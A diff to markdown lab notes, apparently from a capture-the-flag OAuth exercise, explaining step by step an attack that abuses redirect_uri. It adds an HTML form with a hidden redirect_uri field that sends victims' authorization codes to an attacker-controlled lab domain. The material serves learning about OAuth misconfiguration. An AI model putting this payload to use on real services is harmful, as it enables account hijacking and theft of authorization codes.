@@ -346,8 +346,28 @@ If `redirect_uri` validation is weak or misconfigured:
 
 Attack Flow (Step-by-Step)
 
-### 1. Attacker Controls a Redirect Domain
+##### 1. Attacker Controls a Redirect Domain
 
 ```
-http://dev.bistro.thm:8002/redirect_uri.html
+http://dev.bistro.thm:8002/
 ```
+
+##### 2. Attacker Crafts a Malicious OAuth Request
+
+Attacker forces a **fake redirect_uri** using a hidden parameter:
+
+```
+<form action="http://coffee.thm:8000/oauthdemo/oauth_login/" method="get">
+  <input type="hidden" name="redirect_uri"
+         value="http://dev.bistro.thm:8002/malicious_redirect.html">
+  <input type="submit" value="Hijack OAuth">
+</form>
+```
+
+✔ Victim sees a normal “Login via OAuth” button
+
+##### 3. Victim Authorizes the App
+
+- Victim logs in to OAuth provider
+    
+- Authorization server redirects **authorization code** to attacker’s domain
